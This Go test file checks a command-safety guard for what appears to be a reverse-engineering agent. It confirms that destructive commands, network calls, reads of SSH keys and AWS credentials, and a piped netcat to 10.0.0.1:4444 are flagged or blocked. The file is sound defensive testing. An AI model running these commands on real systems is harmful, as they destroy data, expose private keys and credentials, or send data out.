package security

import (
	"strings"
	"testing"

	"github.com/overkazaf/re-agent/internal/types"
)

func TestCommandConcerns(t *testing.T) {
	locked := &types.ExecutionPolicy{}
	open := &types.ExecutionPolicy{AllowNetwork: true, AllowSensitive: true}

	cases := []struct {
		command string
		policy  *types.ExecutionPolicy
		want    string
	}{
		{"rm -rf /tmp/x", locked, "destructive"},
		{"sudo reboot", locked, "destructive"},
		{"curl https://example.com", locked, "network"},
		{"cat ~/.ssh/id_rsa", locked, "sensitive"},
		{"file ./chall", locked, ""},
		{"curl https://example.com", open, ""},
	}
	for _, testCase := range cases {
		concerns, err := CommandConcerns(testCase.command, testCase.policy)
		if err != nil {
			t.Fatal(err)
		}
		joined := strings.Join(concerns, " ")
		if testCase.want == "" {
			if len(concerns) != 0 {
				t.Fatalf("%q should be unremarkable, got %v", testCase.command, concerns)
			}
			continue
		}
		if !strings.Contains(joined, testCase.want) {
			t.Fatalf("%q should raise a %s concern, got %v", testCase.command, testCase.want, concerns)
		}
	}

	if _, err := CommandConcerns("   ", locked); err == nil {
		t.Fatal("an empty command must be rejected")
	}
}

func TestNetworkTokensMatchWholeWordsOnly(t *testing.T) {
	locked := &types.ExecutionPolicy{}
	concerns, _ := CommandConcerns("./concat_files.sh", locked)
	if len(concerns) != 0 {
		t.Fatalf("a substring must not trip the network rule: %v", concerns)
	}
	concerns, _ = CommandConcerns("cat x | nc 10.0.0.1 4444", locked)
	if len(concerns) == 0 {
		t.Fatal("a piped netcat should be flagged")
	}
}

func TestValidatePathReadAndWrites(t *testing.T) {
	locked := &types.ExecutionPolicy{}
	if err := ValidatePathRead("/home/me/.aws/credentials", locked); err == nil {
		t.Fatal("a sensitive path must be blocked")
	}
	if err := ValidatePathRead("/tmp/chall.bin", locked); err != nil {
		t.Fatalf("an ordinary path must be readable: %v", err)
	}
	if err := ValidatePathRead("/home/me/.aws/credentials",
		&types.ExecutionPolicy{AllowSensitive: true}); err != nil {
		t.Fatalf("--allow-sensitive must lift the block: %v", err)
	}
	if err := ValidateWriteAllowed(locked); err == nil {
		t.Fatal("writes are off by default")
	}
	if err := ValidateWriteAllowed(&types.ExecutionPolicy{AllowWrites: true}); err != nil {
		t.Fatalf("--write must permit writes: %v", err)
	}
}
